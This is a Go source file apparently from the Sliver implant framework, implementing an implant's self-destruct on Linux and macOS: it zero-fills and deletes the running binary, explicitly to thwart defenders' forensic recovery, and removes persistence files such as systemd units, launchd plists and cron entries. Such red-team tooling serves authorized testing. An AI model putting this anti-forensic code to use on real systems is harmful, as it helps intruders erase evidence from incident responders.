//go:build linux || darwin

package burn

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"os"
	"os/exec"
)

// wipeSelf removes the running binary at exe. On POSIX this is
// straightforward: the kernel keeps the file's pages alive until the
// process exits, so unlinking now is safe — the file content
// disappears from disk while the process keeps running off its
// in-memory copy.
//
// We try to zero-fill the on-disk image before unlinking on the
// chance that file recovery tools (e.g., a defender mounting the
// disk read-only post-incident) find unlinked-but-not-overwritten
// inodes. Best-effort — failure falls through to plain remove.
func wipeSelf(exe string) {
	if info, err := os.Stat(exe); err == nil && info.Mode().IsRegular() {
		if f, err := os.OpenFile(exe, os.O_WRONLY, 0); err == nil {
			zero := make([]byte, 4096)
			size := info.Size()
			for off := int64(0); off < size; off += int64(len(zero)) {
				n := int64(len(zero))
				if size-off < n {
					n = size - off
				}
				_, _ = f.Write(zero[:n])
			}
			_ = f.Sync()
			_ = f.Close()
		}
	}
	_ = os.Remove(exe)
}

// wipePersistence walks each path. For Linux/Darwin, persistence
// usually means: systemd unit files, launchd plists, cron entries,
// rc.local, autostart .desktop files. The caller passes absolute
// paths; we remove them. systemctl/launchctl disable steps are NOT
// run here because:
//
//	(a) they require running the systemctl binary, which may not be
//	    on PATH or may require privileges we don't have,
//	(b) unit-file removal causes systemctl daemon-reload to drop the
//	    definition on its next refresh,
//	(c) the implant might be in a position where it CAN unlink the
//	    file but can't shell out (sandboxed).
//
// Operators who want clean systemctl unregistration should add an
// ExecPostStop step to the unit itself before installation, or
// pair self-destruct with a cron @reboot stub that does `systemctl
// daemon-reload`.
func wipePersistence(paths []string) {
	for _, p := range paths {
		if p == "" {
			continue
		}
		wipePath(p)
	}
}

// Linker reference: keep exec imported even when persistence paths
// list is empty — future versions may want to invoke systemctl /
// launchctl for proper unregistration on platforms where the implant
// has the privileges.
var _ = exec.Command
